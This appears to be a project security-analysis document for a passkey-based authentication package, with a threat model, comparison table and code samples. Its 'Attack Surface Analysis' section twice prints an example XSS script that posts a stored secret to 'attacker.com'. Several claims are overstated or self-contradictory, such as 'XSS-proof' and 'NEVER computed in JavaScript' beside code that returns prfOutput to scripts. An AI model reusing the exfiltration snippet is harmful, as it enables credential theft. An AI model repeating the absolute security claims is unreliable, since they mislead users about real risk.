# Security Analysis

Comprehensive security analysis of `@MaiaOS/self` authentication system.

---

## Overview

`@MaiaOS/self` provides hardware-backed, zero-storage authentication that is **more secure** than traditional password-based systems and browser extension password managers.

**Key Security Properties:**
- ✅ **Hardware-backed secrets** - PRF evaluation in Secure Enclave/TPM
- ✅ **Zero browser storage** - No secrets in localStorage/sessionStorage
- ✅ **XSS-proof** - No secrets accessible to JavaScript
- ✅ **Phishing-resistant** - Domain-bound credentials (WebAuthn)
- ✅ **Keylogger-proof** - No keyboard input (biometric only)

---

## Threat Model

### Attack Vectors

#### 1. XSS (Cross-Site Scripting)

**What is it:** Malicious website injects code to steal secrets.

**Traditional Approach:**
- Secrets stored in localStorage
- XSS attack reads localStorage → full account access

**MaiaOS:**
- ✅ **Zero secrets in browser storage**
- ✅ Secrets derived in Secure Enclave (hardware-isolated)
- ✅ XSS cannot access passkey (requires biometric/PIN)

**Result:** ✅ XSS attack fails (nothing to steal)

---

#### 2. Malicious Browser Extension

**What is it:** Fake or compromised extension spies on you.

**Traditional Approach:**
- Extensions can read other extensions' data
- Malicious extension captures master password
- Full account compromise

**MaiaOS:**
- ✅ **No extension required** - Web app only
- ✅ Malicious extensions cannot access Secure Enclave
- ✅ Hardware isolation protects secrets

**Result:** ✅ Extension attacks mitigated (no extension attack surface)

---

#### 3. Phishing

**What is it:** Fake website tricks you into revealing password.

**Traditional Approach:**
- User enters password on fake site
- Attacker captures password → full access

**MaiaOS:**
- ✅ **No password to phish** - Biometric only
- ✅ Passkeys are domain-bound (only work on real site)
- ✅ Fake site cannot trick biometric sensor

**Result:** ✅ Phishing attack fails (no password to steal)

---

#### 4. Keylogger (Spyware)

**What is it:** Malware records every key you press.

**Traditional Approach:**
- Keylogger captures master password
- Attacker has full account access

**MaiaOS:**
- ✅ **No keyboard input** - Biometric only
- ✅ Keylogger cannot capture fingerprint/face
- ✅ PRF evaluation in hardware (keylogger can't see it)

**Result:** ✅ Keylogger attack fails (no keyboard input)

---

#### 5. Memory Dump Attack

**What is it:** Malware reads computer memory to find secrets.

**Traditional Approach:**
- Decrypted passwords sit in RAM
- Memory dump reveals everything

**MaiaOS:**
- ✅ PRF output sits in RAM **temporarily**
- ✅ Secrets cleared immediately after use
- ✅ Secure Enclave protects PRF evaluation
- ✅ Ephemeral secrets (derived on-demand)

**Result:** ✅ Memory dump mitigated (secrets cleared, hardware-protected)

---

#### 6. Device Theft

**What is it:** Someone steals your device and tries to access your account.

**Traditional Approach:**
- Secrets in localStorage → attacker has access
- Needs master password (but might be weak)

**MaiaOS:**
- ✅ Passkey in Secure Enclave (hardware-isolated)
- ✅ Cannot extract without biometric/PIN
- ✅ Hardware rate-limiting prevents brute force

**Result:** ✅ Device theft mitigated (hardware protection)

---

#### 7. Server Breach

**What is it:** Hackers break into the sync server.

**Traditional Approach:**
- Encrypted vaults stored on server
- Weak master passwords can be cracked
- Future quantum computers might break encryption

**MaiaOS:**
- ✅ **Master secret NEVER stored anywhere**
- ✅ Even if Jazz server is hacked, secrets are in hardware
- ✅ Zero-knowledge sync (server cannot decrypt)

**Result:** ✅ Server breach mitigated (master secret never leaves device)

---

## Security Comparison

### MaiaOS vs Browser Extension Password Manager

| Attack Vector | Browser Extension | MaiaOS | Winner |
|---------------|-------------------|--------|--------|
| XSS | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
| Malicious Extensions | 🔴 High | 🟢 Low | 🏆 MaiaOS |
| Phishing | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
| Keylogger | 🔴 High | 🟢 Zero | 🏆 MaiaOS |
| Memory Dump | 🔴 High | 🟢 Low | 🏆 MaiaOS |
| Device Theft | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
| Server Breach | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |

**Final Score:** MaiaOS wins **7 out of 7** attack vectors! 🎉

---

## Why MaiaOS is More Secure

### 1. Hardware-Backed Secrets

**Traditional:**
- Secrets generated in JavaScript (software)
- Stored in browser storage (software)
- Accessible to any JavaScript code

**MaiaOS:**
- PRF evaluation in Secure Enclave/TPM (hardware)
- Secrets never leave hardware during derivation
- Accessible only with biometric/PIN

**Security Benefit:**
- ✅ Cannot be extracted by XSS attacks
- ✅ Cannot be logged or sent to error tracking
- ✅ Cannot be stolen from memory dumps

---

### 2. Zero Browser Storage

**Traditional:**
- Must store secrets in localStorage/sessionStorage
- Must store accountID for recovery
- Vulnerable to XSS attacks

**MaiaOS:**
- ✅ Zero secrets in JavaScript (hardware only)
- ✅ Zero accountID in browser storage (computed on-demand)
- ✅ Zero metadata (no "isLoggedIn" flags)
- ✅ XSS cannot access passkey (requires biometric/PIN)

**Security Benefit:**
- ✅ XSS attacks cannot steal secrets
- ✅ Cannot be extracted from browser DevTools
- ✅ Cannot be copied to clipboard
- ✅ Cannot be logged by extensions

---

### 3. Deterministic Account Recovery

**Traditional:**
- Random secret → accountID unknown until account created
- Must store accountID to recover account

**MaiaOS:**
- PRF (deterministic) → accountID **computable before creation!**
- Same passkey + salt → always same accountID

**Security Benefit:**
- ✅ Cross-device recovery without server-side account storage
- ✅ No "forgot password" flow needed
- ✅ No password reset vulnerabilities
- ✅ User controls their identity (self-sovereign)

---

### 4. No Extension Attack Surface

**Traditional:**
- Extension runs in browser
- Malicious extensions can spy
- Extension vulnerabilities

**MaiaOS:**
- ✅ No extension = no extension vulnerabilities
- ✅ Malicious extensions cannot spy on you
- ✅ One less thing to attack

---

## Security Properties

### What We Achieve

#### 1. Hardware-Backed Secrets (Secure Enclave/TPM)

```javascript
// PRF evaluation happens in hardware!
const { prfOutput } = await createPasskeyWithPRF({
  name: "maia",
  userId: randomBytes(32),
  salt: stringToUint8Array("maia.city")
});

// prfOutput NEVER computed in JavaScript
// Evaluation isolated in Secure Enclave/TPM
// Requires biometric/PIN for every access
```

**Security benefit:**
- ✅ Secrets never in JavaScript memory (hardware-isolated)
- ✅ Cannot be extracted by XSS attacks
- ✅ Cannot be logged or sent to error tracking
- ✅ Cannot be stolen from memory dumps

---

#### 2. Zero Browser Storage (XSS-Proof)

```javascript
// NO secrets in localStorage
localStorage.getItem('accountSecret'); // → null

// NO secrets in sessionStorage
sessionStorage.getItem('accountSecret'); // → null

// NO secrets in IndexedDB (only public CoValue data)
// NO secrets in cookies
// NO secrets anywhere in browser!
```

**Security benefit:**
- ✅ XSS attacks cannot steal secrets
- ✅ Cannot be extracted from browser DevTools
- ✅ Cannot be copied to clipboard
- ✅ Cannot be logged by extensions

---

#### 3. Deterministic Account Recovery

```javascript
// Same passkey + same salt → ALWAYS same account
const passkey1 = await signUpWithPasskey({ name: "alice", salt: "maia.city" });
// → accountID: "co_zABC..."

// Later, on different device with same passkey:
const passkey2 = await signInWithPasskey({ salt: "maia.city" });
// → accountID: "co_zABC..." (SAME!)

// This is deterministic because:
// 1. PRF(passkey, salt) → always same prfOutput
// 2. prfOutput → always same agentSecret
// 3. agentSecret → always same accountID (no random fields!)
```

**Security benefit:**
- ✅ Cross-device recovery without server-side account storage
- ✅ No "forgot password" flow needed
- ✅ No password reset vulnerabilities
- ✅ User controls their identity (self-sovereign)

---

#### 4. End-to-End Encryption (Jazz Cloud Cannot Read)

```javascript
// All CoValue data is encrypted with keys only you control
const node = await LocalNode.withNewlyCreatedAccount({
  crypto,
  initialAgentSecret: agentSecret, // Only you have this!
  peers: [jazzSyncPeer],           // Jazz Cloud sync
  storage: indexedDBStorage
});

// Jazz Cloud stores encrypted transactions
// Server cannot decrypt content
// Only devices with your agentSecret can read data
```

**Security benefit:**
- ✅ Zero-knowledge sync (server cannot read your data)
- ✅ No "data breach" risk (server has encrypted blobs only)
- ✅ No trust required in sync provider
- ✅ You control encryption keys (not the server)

---

## Attack Surface Analysis

### XSS Attack (Cross-Site Scripting)

**Traditional Approach:**
```javascript
// Attacker injects:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accountSecret') // ❌ Full access!
  });
</script>
```

**MaiaOS:**
```javascript
// Attacker tries:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accountSecret') // → null (not stored!)
  });
</script>

// To access passkey, attacker would need:
// 1. User's biometric (impossible to steal via XSS)
// 2. User's PIN (impossible to steal via XSS)
// 3. Physical access to device (not via XSS)
```

**Result:** ✅ XSS attack fails (no secrets to steal)

---

### Device Theft

**Traditional Approach:**
- Attacker steals device
- Extracts localStorage secrets
- Full account access (no biometric required)

**MaiaOS:**
- Attacker steals device
- Passkey in Secure Enclave (hardware-isolated)
- Cannot extract without biometric/PIN
- Cannot brute-force (hardware rate-limiting)

**Result:** ✅ Device theft mitigated (hardware protection)

---

### Phishing Attack

**Traditional Approach:**
- Attacker creates fake login page
- User enters password
- Attacker captures password → Full access

**MaiaOS:**
- Attacker creates fake login page
- User clicks "Sign in with passkey"
- WebAuthn verifies domain → Passkey only works on real domain
- Attacker cannot capture passkey

**Result:** ✅ Phishing attack fails (domain-bound credentials)

---

## Implementation Requirements

### DO ✅

1. **Always use PRF** (strict mode, no fallbacks)
2. **Never log secrets** to console or error tracking
3. **Use HTTPS only** (passkeys require secure context)
4. **Validate accountID computation** (verify match after creation)
5. **Trust hardware** (let Secure Enclave/TPM do its job)
6. **Default salt: "maia.city"** (consistent for deterministic recovery)

### DON'T ❌

1. **Never store secrets in browser storage** (localStorage, sessionStorage, IndexedDB)
2. **Never store accountID in browser storage** (compute on-demand)
3. **Never create backwards-compatible fallbacks** (PRF or nothing!)
4. **Never bypass biometric/PIN** (hardware protection is our security model)
5. **Never log prfOutput** (treat as master password)
6. **Never send secrets to server** (even encrypted - unnecessary!)

---

## Related Documentation

- [Main README](./README.md) - Package overview
- [auth-flows.md](./auth-flows.md) - Registration and login flows
- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts
- [api-reference.md](./api-reference.md) - API reference
- [Security Improvements](../architecture/security-improvements.md) - Detailed security analysis
